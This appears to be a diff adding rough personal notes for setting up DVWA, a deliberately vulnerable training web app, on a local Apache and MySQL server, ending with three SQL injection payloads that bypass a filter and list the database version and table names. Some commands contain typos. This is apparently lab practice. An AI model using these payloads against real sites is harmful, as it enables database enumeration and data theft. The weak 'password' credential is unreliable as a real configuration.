@@ -1,0 +1,35 @@
+sudo su
+git clone https://github.com/digininja/DVWA.git
+ls
+mv DVWA /var/www/html
+cd /var/www/html
+ls
+service apache2 start
+cd DVWA
+ls
+cp config/config.inc.php.dist config/config.inc.php
+service meriadb start
+sudo systemctl start mysql
+sudo systemctl status mysql
+
+sql
+	create database dvwa;
+	create user dvwa@localhost identified by 'password';
+	grant all on dvwa.* to dvwa@localhost;
+	flush privileges;
+	exit
+
+sudo nano /var/www/html/DVWA/config/config.inc.php
+
+change p@ssw0rd to password
+
+sudo systemctl restart apache2
+sudo systemctl restart sql
+
+http://localhost/DVWA/setup.php
+
+sql injection:
+
+%' or '0'='0 
+%' or 0=0 union select null,version() # 
+%' and 1=0 union select null,table_name from information_schema.tables #Click 
